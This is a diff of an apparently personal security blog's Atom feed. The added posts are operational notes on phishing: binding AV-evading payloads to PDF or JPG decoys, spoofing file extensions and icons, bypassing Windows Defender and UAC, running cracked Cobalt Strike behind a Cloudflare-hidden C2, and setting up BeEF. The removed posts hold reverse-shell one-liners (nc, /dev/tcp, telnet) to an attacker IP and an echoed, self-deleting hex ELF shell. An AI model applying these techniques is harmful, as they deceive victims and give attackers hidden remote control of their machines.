@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2021-07-03T14:42:58.000Z</updated>
+  <updated>2022-04-13T12:38:59.389Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -14,6 +14,146 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>捆绑钓鱼</title>
+    <link href="http://kevien.github.io/2022/04/13/%E6%8D%86%E7%BB%91%E9%92%93%E9%B1%BC/"/>
+    <id>http://kevien.github.io/2022/04/13/捆绑钓鱼/</id>
+    <published>2022-04-13T09:05:35.000Z</published>
+    <updated>2022-04-13T12:38:59.389Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>不是什么新技术，只是记录自己在探索实践过程中遇到的问题以及如何解决相应的问题，留存笔记以免忘记。<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2></li>
+<li>捆绑的意思就是恶意程序以一个正常的程序（可以是程序也可以是文件如doc、pdf、jpg等）为载体，当这个“程序”执行的时候恶意程序即可运行。用于捆绑钓鱼的工具有很多，像是(BDF)[<a href="https://github.com/secretsquirrel/the-backdoor-factory]应该是比较早的一款工具，但现在好像是不怎么免杀了，前段时间看过现在都在用[NimFileBinder](https://github.com/evilashz/NimFileBinder)这个工具进行捆绑，且免杀一些常见杀软，这个主要是利用了Nim这个小众的语言做的（类似go，一些小众语言有时能做到很好的免杀）。我简单看了下作者的代码，整体还是比较简单的，对可执行文件的加密以及直接cmd" target="_blank" rel="noopener">https://github.com/secretsquirrel/the-backdoor-factory]应该是比较早的一款工具，但现在好像是不怎么免杀了，前段时间看过现在都在用[NimFileBinder](https://github.com/evilashz/NimFileBinder)这个工具进行捆绑，且免杀一些常见杀软，这个主要是利用了Nim这个小众的语言做的（类似go，一些小众语言有时能做到很好的免杀）。我简单看了下作者的代码，整体还是比较简单的，对可执行文件的加密以及直接cmd</a> /c 执行程序，作者也说了代码比较粗糙，其中还有两个注意点，比如要修改代码进行恶意程序自删除，还有绕过杀软的一个小技巧，这个在使用过程当中可以自己去适当修改。<h2 id="绑定测试"><a href="#绑定测试" class="headerlink" title="绑定测试"></a>绑定测试</h2></li>
+<li>这里我们首先是利用工具<a href="https://github.com/crisprss/Shellcode_Memory_Loader" target="_blank" rel="noopener">Shellcode_Memory_Loader</a>生成一个免杀exe可执行文件（注意这个工具是使用go进行编译的），然后利用nimFileBinder工具捆绑pdf或者jpg文件，首先是安装nim，关于这个编译器的安装我之前是网上看的<a href="http://moy1sec.com/2021/12/20/mian-sha-diao-yu-kun-bang/" target="_blank" rel="noopener">文章</a>，然后在linux安装结果一大堆坑（主要是gfw的问题），就不过多说了，后面看到这篇文章才去发现还是在windows上安装更适合我，<a href="https://mp.weixin.qq.com/s?__biz=Mzg5OTY1ODMxMg==&amp;mid=2247488869&amp;idx=1&amp;sn=654cd56b2fd2cc65528297250a6a19c8&amp;chksm=c04eb242f7393b547421fedbd2889bf3fa238fadb7e62e942e8b9557545f4205e0bfc7883324&amp;token=839247748&amp;lang=zh_CN#rd" target="_blank" rel="noopener">XSS Flash弹窗钓鱼</a>,这篇文章里面就提到了在windows下安装nim以及一些nim库的问题，注意安装strfmt、nimcrypto的时候需要fq。<br>安装完成之后就可以对相应的exe文件进行绑定了，绑定完成这只是第一步。<h2 id="后缀伪装"><a href="#后缀伪装" class="headerlink" title="后缀伪装"></a>后缀伪装</h2></li>
+<li>第一步绑定完成之后其实还是exe可执行文件，当然如果你要是直接绑定的exe文件这一步就可以跳过了（这种一般都是比较信任的人才会去点exe，而且有时候一些钓鱼场景里需要我们制作的是jpg或者pdf），就不需要伪装后缀了，毕竟受害者是要看pdf的，你发一个exe后缀的明显不太合适，关于后缀伪装有两种方式，一种是利用<a href="https://wolke.cn/post/5653cc29.html" target="_blank" rel="noopener">RLO的Unicode反转文件后缀钓鱼</a>，还有一种是在后面填充大量的空格。如图所示<br><img src="/2022/04/13/捆绑钓鱼/spacehide.png" alt=""></li>
+<li>当然拉长文件名（名称）也是能够看到异常的，而且文件类型列也是应用程序有问题的。<h2 id="图标伪装"><a href="#图标伪装" class="headerlink" title="图标伪装"></a>图标伪装</h2></li>
+<li>第三步是图标伪装，后缀伪装完成之后还有默认的ico，很明显不是pdf或者jpg，那么是否有修改ico的方式，网上有一些修改ico的工具，比如resourcehacker工具，这个工具的原理应该是识别windows可执行文件的rsc区然后进行修改，但当我在测试的时候却发现我这里修改我之前使用Shellcode_Memory_Loader工具编译的exe并不能行，而其它的exe可以成功，猜测可能是因为go编译的原因，然后一番搜索之后发现原来go编译的时候可以进行图标的自定义，参考文章<a href="https://studygolang.com/articles/7980" target="_blank" rel="noopener">教你为Win下的Go程序添加图标</a>,当然在编译的时候注意直接 go build  -ldflags=”-H windowsgui” 就行 不要加xxx.go,否则生成图标失败。当然这里还是得有windows常见默认文件ico，网上搜了半天没搜到合适的就用png图片转ico做了个粗糙版的默认ico，如果你需要pdf.ico、jpg.ico可以找我分享给你～<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2></li>
+<li><a href="https://security.tencent.com/index.php/blog/msg/165" target="_blank" rel="noopener">红蓝对抗之邮件钓鱼攻击</a></li>
+<li><a href="https://www.cnblogs.com/yokan/p/15748583.html" target="_blank" rel="noopener">常见钓鱼手法 </a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;不是什么新技术，只是记录自己在探索实践过程中遇到的问题以及如何解决相应的问题，留存笔记以免忘记。&lt;h2 
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>cs免杀上线及使用注意事项</title>
+    <link href="http://kevien.github.io/2022/04/12/cs%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
+    <id>http://kevien.github.io/2022/04/12/cs免杀上线及使用注意事项/</id>
+    <published>2022-04-12T10:21:05.000Z</published>
+    <updated>2022-04-13T12:47:28.792Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="cs免杀"><a href="#cs免杀" class="headerlink" title="cs免杀"></a>cs免杀</h2><ul>
+<li>在上一篇cobaltstrike cdn上线隐藏c2 ip 之后，发现目标机器是win10，而win10一般都会开启windows defender（后面都简称wd）以及uac。</li>
+<li>第一个问题就是如果绕过windows defender，网上有很多相关的免杀技术文章，有些已经过时有些还可以使用，我在测试了几个之后发现这篇文章介绍的技术目前还是可以bypass wd以及某数字杀软的，参考文章<a href="https://www.anquanke.com/post/id/262666" target="_blank" rel="noopener">CS shellcode内存加载器免杀及实现</a>。需要使用golang进行编译，注意编译时候添加选项  -ldflags=”-H windowsgui”，这样就没有黑框了。</li>
+<li><p>第二个问题就是我们接收到的beacon一般是管理员组的用户，但想要执行一些特殊操作，比如想要执行hashdump或者其他特权命令的时候,需要bypass uac.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">关闭wd reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 1 /t REG_DWORD /f，</span><br><span class="line">开启wd reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v &quot;DisableAntiSpyware&quot; /d 0 /t REG_DWORD /f）</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>那么如何bypass uac 呢？同样网上有很多相关的文章，其中当属 hfiref0x的UACME较为流传广泛，且作者一直在更新这个工具（<a href="https://github.com/hfiref0x/UACME），~~自己没有去编译这个工具~~，而是使用了另外一款工具，https://github.com/0x9ef/golang-uacbypasser，也是glang写的，用了一下效果还可以，但不免杀，进行bypass" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME），~~自己没有去编译这个工具~~，而是使用了另外一款工具，https://github.com/0x9ef/golang-uacbypasser，也是glang写的，用了一下效果还可以，但不免杀，进行bypass</a> uac的时候会被wd干掉，所以还需做一下免杀（或者开启vnc desktop pid x86/64 low/high 远程桌面连接上去之后手动关闭wd）。cs上执行命令 shell main.exe  /o /path artifact.exe,之后上线的就是bypass的beacon，这个beacon就直接可以 hashdump以及一些特权操作了。<br><img src="/2022/04/12/cs免杀上线及使用注意事项/hashdump.png" alt=""></p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2></li>
+<li>1.大家在下载和使用cs的时候一定要去校验哈希，防止被黑吃黑，cs4.4下载地址<a href="https://github.com/k8gege/Aggressor/releases/tag/cs，以及到官方check哈希，https://verify.cobaltstrike.com/，然后配置https://github.com/Twi1ight/CSAgent" target="_blank" rel="noopener">https://github.com/k8gege/Aggressor/releases/tag/cs，以及到官方check哈希，https://verify.cobaltstrike.com/，然后配置https://github.com/Twi1ight/CSAgent</a> 进行破解，这样用起来会比较放心。</li>
+<li>2.在目标机器上执行命令的时候一定要非常小心，要执行的命令首先在测试机上测试一下，否则很容易被一些杀软动态查杀给干掉（然后你来之不易的beacon就掉线了）。比如这个脚本执行的时候<br><img src="/2022/04/12/cs免杀上线及使用注意事项/checkvm.png" alt=""><br><img src="/2022/04/12/cs免杀上线及使用注意事项/wd.png" alt=""><br><img src="/2022/04/12/cs免杀上线及使用注意事项/wd1.png" alt=""></li>
+<li>3.teamserver经常掉线或者执行命令非常卡的时候可以考虑换个网络好点儿的vps，否则真的非常崩溃，且更换vps其实也很简单，之前的文章中cdn架构中也只需要修改cloudflare的dns一处即可。</li>
+<li>4.cs的sleep心跳间隔默认是60s，可以设置成2s，0s不建议，因为一直保持连接可能会被发现并拦截。</li>
+<li>5.进程迁移之后，建议unhook ntdll.dll 可以防止一些杀软的查杀。</li>
+<li>6.cs还有一些特征会被wd进行查杀，建议在使用的时候还是进行进一步的免杀，参考文章<a href="https://ucasers.cn/%E5%AF%B9cobaltstrike4.4%E7%9A%84%E7%AE%80%E5%8D%95%E9%AD%94%E6%94%B9/" target="_blank" rel="noopener">对cobaltstrike4.4的简单魔改</a>，以及b站上视频<a href="https://space.bilibili.com/38824668/channel/collectiondetail?sid=309610" target="_blank" rel="noopener">从0开始学免杀</a></li>
+<li>7.有时候我们拿到beacon之后如果不及时去迁移进程及权限维持很有可能会出现掉线（尤其是钓鱼的时候往往又不太方便第二次钓鱼），所以这个时候就需要我们收到beacon之后能及时知晓，这里有很多种方法，比如上线之后发送到微信或者钉钉，可以使用上线通知插件。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果想使用免费且支持微信模板消息推送的方式可以移步：https://github.com/lintstar/CS-PushPlus</span><br><span class="line"></span><br><span class="line">如果有订阅 ServerChan 的企业微信推送通道可以移步：https://github.com/lintstar/CS-ServerChan</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;cs免杀&quot;&gt;&lt;a href=&quot;#cs免杀&quot; class=&quot;headerlink&quot; title=&quot;cs免杀&quot;&gt;&lt;/a&gt;cs免杀&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;在上一篇cobaltstrike cdn上线隐藏c2 ip 之后，发现目标机器是win10，而win10一般都会
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>beef搭建踩坑及隐匿</title>
+    <link href="http://kevien.github.io/2022/04/03/beef%E6%90%AD%E5%BB%BA%E8%B8%A9%E5%9D%91%E5%8F%8A%E9%9A%90%E5%8C%BF/"/>
+    <id>http://kevien.github.io/2022/04/03/beef搭建踩坑及隐匿/</id>
+    <published>2022-04-03T12:27:23.000Z</published>
+    <updated>2022-04-13T12:48:54.939Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/2022/04/03/beef搭建踩坑及隐匿/flash.png" alt=""><br><img src="/2022/04/03/beef搭建踩坑及隐匿/windows-auth.png" alt=""></p>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>搭建基础工具cs之后，想着怎么搭建个钓鱼平台，看了像是flash钓鱼、windows凭据钓鱼、google页面钓鱼、印象笔记钓鱼，发现xss平台beef也都有这些工具，那为何不搭建个beef平台更方便呢，之前搭建过beef，但都也只是简单测试用，并没有真正去有效使用，实战使用起来就会发现一些问题。<h2 id="中间过程"><a href="#中间过程" class="headerlink" title="中间过程"></a>中间过程</h2></li>
+<li>首先第一个问题，因为要attack的是一个https网站，如果插入的为<a href="http://ip/hook.js,浏览器的安全策略不允许这样干，所以beef要开启https功能，开启https功能很简单，按照github上的wiki，修改config.yaml文件中的beef.http.https.enable" target="_blank" rel="noopener">http://ip/hook.js,浏览器的安全策略不允许这样干，所以beef要开启https功能，开启https功能很简单，按照github上的wiki，修改config.yaml文件中的beef.http.https.enable</a> 为true即可,但因为beef为不信任证书，所以网站加载hook.js还是不行，解决办法就是给申请一张受信任证书，那自然就想到letsencrypt的免费https证书，然后还有域名的话可以去freenom上申请（域名申请可以参考cs那篇文章，可以选择适当的域名，比如 cdn.domain.com 啥的），其实在这里除了自己申请域名之外也可以使用ngrok（<a href="https://github.com/beefproject/beef/search?q=ngrok&amp;type=issues和https://github.com/beefproject/beef/wiki/Release-Notes" target="_blank" rel="noopener">参考</a>）。</li>
+<li>第二个问题是证书出问题，自己在申请好证书之后，将beef_cert.pem和beef_key分别修改为fullchain.pem和privkey.pem，发现还是报错，查询了一会儿也没解决问题，一时陷入僵局。冷静思考了一会儿，想想自己之前搭建ctfd平台的时候，使用了nginx做了反向代理，当时的证书是没有这个问题的，那么尝试一下看行不行，结果是可行（参考<a href="https://shirmy.me/article/12）。" target="_blank" rel="noopener">https://shirmy.me/article/12）。</a></li>
+<li>第三个问题，beef默认端口是3000，最开始自己尝试使用官方的github的docker进行构建，但是每次修改config.yaml都要重新构建镜像，而构建这个镜像又非常耗时，所以最后还是使用install脚本进行安装和调试，在调试过程中，发现直接访问beef后台以及hook.js 没有问题，但是并没有上线，打开浏览器网络发现请求的是域名的3000端口，这个时候修改beef.http.public.port为443即可。</li>
+<li>本来以为处理这个问题应该很快，两三个小时就能搞定，结果断断续续花了两天时间才整完，当然在整个问题的解决过程当中自己也查看了beef的wiki，使自己对beef也有了更进一步的了解，只是http下的public和https让我一开始没怎么搞懂，费了半天劲。</li>
+<li>附上nginx配置截图<br><img src="/2022/04/03/beef搭建踩坑及隐匿/nginx-conf.png" alt=""></li>
+<li>然后看下beef的主要配置截图<br><img src="/2022/04/03/beef搭建踩坑及隐匿/beef-conf.png" alt=""></li>
+<li>除此之后beef还可以和msf联动。可参考文章：<br><a href="https://blog.csdn.net/u014029795/article/details/116755248" target="_blank" rel="noopener">https://blog.csdn.net/u014029795/article/details/116755248</a><br><a href="https://github.com/beefproject/beef/issues/1322" target="_blank" rel="noopener">https://github.com/beefproject/beef/issues/1322</a><br><img src="/2022/04/03/beef搭建踩坑及隐匿/beef.png" alt=""></li>
+<li>完成联动之后就可以使用msf针对浏览器的一些exploit攻击。</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;/2022/04/03/beef搭建踩坑及隐匿/flash.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2022/04/03/beef搭建踩坑及隐匿/windows-auth.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;h2 id=&quot;TL-DR&quot;&gt;&lt;a
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>cobaltstrike cdn上线隐藏c2 ip</title>
+    <link href="http://kevien.github.io/2022/03/29/cobaltstrike-cdn%E4%B8%8A%E7%BA%BF%E9%9A%90%E8%97%8Fc2-ip/"/>
+    <id>http://kevien.github.io/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/</id>
+    <published>2022-03-29T12:15:57.000Z</published>
+    <updated>2022-04-13T12:26:21.184Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="笔记记录"><a href="#笔记记录" class="headerlink" title="笔记记录"></a>笔记记录</h2><ul>
+<li><p>最近测试了cobaltstrike cdn上线隐藏c2 ip，简短记录一下。</p>
+</li>
+<li><p>参考了文章  cobalt strike cdn上线笔记，文章没什么问题，但在实际测试过程当中遇到了一些坑点，特此记录一下。</p>
+</li>
+<li><p>首先自己按照文章搭建好之后发现上不了线</p>
+<ol>
+<li><p>首先排查一下是不是软件的问题，自己用的cs4.3，http的上线没有问题，故排除是cs工具问题</p>
+</li>
+<li><p>自己用的openjdk，当时怀疑是不是自己用来openjdk的问题，我看有些文章上说是oracle jdk可能会好点儿，但是oracle jdk下载比较费劲，得使用oracle账号登录，费了半天劲发现不是java问题</p>
+</li>
+<li><p>排查cdn问题，自己ping了一下自己的cdn解析，发现没有问题，而且使用浏览器访问script web delivery 网页的powershell也没有问题，故排除cdn dns配置问题。</p>
+</li>
+<li><p>后面再次对比文章，发现自己没有开启cloudflare的开发模式，开启之后发现可以上线，但是执行命令没有回显。</p>
+</li>
+<li><p>wireshark抓包分析没找到原因。</p>
+</li>
+<li><p>最后搜索文章发现如下两篇文章 <a href="https://bewhale.github.io/posts/50202.html" target="_blank" rel="noopener">CobaltStrike4.4汉化破解及特征去除</a>  <a href="https://myzxcg.com/2020/12/Cobalt-Strike%E5%8E%BB%E7%89%B9%E5%BE%81%E9%85%8D%E7%BD%AENginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86CDN%E4%B8%8ECloudflare-Worker/" target="_blank" rel="noopener">Cobalt-Strike去特征配置Nginx反向代理CDN与Cloudflare-Worker</a><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/cloudflare-cdn.png" alt=""><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/cloudflare-cdn1.png" alt=""></p>
+</li>
+</ol>
+</li>
+<li>没错，我用的就是这个jquery malleable-c2 profile，最终问题解决，成功上线。<br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/beacon.png" alt=""><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/wireshark.png" alt=""><br><img src="/2022/03/29/cobaltstrike-cdn上线隐藏c2-ip/ip.png" alt=""></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;笔记记录&quot;&gt;&lt;a href=&quot;#笔记记录&quot; class=&quot;headerlink&quot; title=&quot;笔记记录&quot;&gt;&lt;/a&gt;笔记记录&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;最近测试了cobaltstrike cdn上线隐藏c2 ip，简短记录一下。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>虚拟化笔记</title>
@@ -917,254 +1057,6 @@
     <summary type="html">
     
       &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>reverse shell的几种方式</title>
-    <link href="http://kevien.github.io/2018/01/30/reverse-shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
-    <id>http://kevien.github.io/2018/01/30/reverse-shell的几种方式/</id>
-    <published>2018-01-30T07:58:01.000Z</published>
-    <updated>2020-06-11T02:23:48.000Z</updated>
-    
-    <content type="html"><![CDATA[<ul>
-<li>20200611 upate</li>
-<li>在线生成各种形式的反弹shell命令  <a href="https://krober.biz/misc/reverse_shell.php?ip=127.0.0.1&amp;port=8080" target="_blank" rel="noopener">https://krober.biz/misc/reverse_shell.php?ip=127.0.0.1&amp;port=8080</a><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4></li>
-<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的方法。</li>
-<li>linux有很多发行版，不同发行版中的内置工具、安全机制等都有所不同。</li>
-<li>下文中的几个例子在大多数的系统中是通用的。</li>
-<li>这里主要重点关注一下4和5</li>
-<li>20200208更新–更多反弹shell方式见<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" target="_blank" rel="noopener">Reverse Shell Cheat Sheet</a><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
-<li>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt;					# A</span><br></pre></td></tr></table></figure>
-<ul>
-<li>现在的netcat版本可能没有-e参数。<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
-<li>那么可以使用下面的命令</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt;	# A</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
-<h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt; 	# A</span><br></pre></td></tr></table></figure>
-<ul>
-<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</span><br><span class="line">nc -n -vv -l -p &lt;port&gt; 	# A</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
-<ul>
-<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2></li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</span><br><span class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</span><br><span class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
-<ul>
-<li>这第五个其实挺有意思。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-机器码"><a href="#6-机器码" class="headerlink" title="6.机器码"></a>6.机器码</h2></li>
-<li>这里的shellcode可以使用msf生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v -l 1337             # Attacker</span><br><span class="line">echo -e &quot;\x7F\x45\x4C\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x60\x80\x04\x08\x34\x00\x00\x00\xBC\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x01\x00\x28\x00\x03\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xAA\x00\x00\x00\xAA\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6A\x66\x58\x6A\x01\x5B\x31\xD2\x52\x53\x6A\x02\x89\xE1\xCD\x80\x92\xB0\x66\x68\x7F\x01\x01\x01\x66\x68\x05\x39\x43\x66\x53\x89\xE1\x6A\x10\x51\x52\x89\xE1\x43\xCD\x80\x6A\x02\x59\x87\xDA\xB0\x3F\xCD\x80\x49\x79\xF9\xB0\x0B\x41\x89\xCA\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80\x00\x2E\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2E\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0B\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x60\x80\x04\x08\x60\x00\x00\x00\x4A\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA\x00\x00\x00\x11\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00&quot; &gt; c; chmod +x c;./c &amp; rm c  # Target</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
-<li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="noopener">Spawning reverse shells</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;20200611 upate&lt;/li&gt;
-&lt;li&gt;在线生成各种形式的反弹shell命令  &lt;a href=&quot;https://krober.biz/misc/reverse_shell.php?ip=127.0.0.1&amp;amp;port=8080&quot; target=&quot;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>linux进程注入(-)</title>
-    <link href="http://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
-    <id>http://kevien.github.io/2018/01/28/linux进程注入/</id>
-    <published>2018-01-28T09:18:28.000Z</published>
-    <updated>2020-01-02T08:38:27.000Z</updated>
-    
-    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">译文声明</span><br><span class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</span><br><span class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</span><br><span class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</span><br><span class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</span><br></pre></td></tr></table></figure>
-<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
-<li>我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我们的代码，但是如何向一个已在运行的进程中注入代码呢?这篇文章我将介绍如何去操作其它进程内存的一些基本技巧…换句话说，就是教你如何去写一个属于你自己的调试器。<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4></li>
-<li>在去介绍技术细节之前，让我先来介绍几个需要注入代码到运行中进程的场景。</li>
-<li>最初的场景并不是应用在恶意软件，而是应用在内存热补丁上。运行的程序不能被关闭或者重启，或者说关闭或者重启需要很多不必要的花销。所以如何在不关闭进程或者不重启进程的情况下去给程序打补丁和更新是前几年一个比较热门的话题。</li>
-<li>另外一个主要的应用场景就是调试器以及逆向工具的开发。例如radare2…通过这篇文章你将学习它们是如何工作的。</li>
-<li>显然另外的一个主要原因还是恶意软件的发展，病毒、后门等。我猜大多数的使用者都是这个原因。一个例子，你们很多人都知道meterpreter的进程注入功能，这个功能够让你运行你的payload在一个’无辜’且正在运行的进程中。</li>
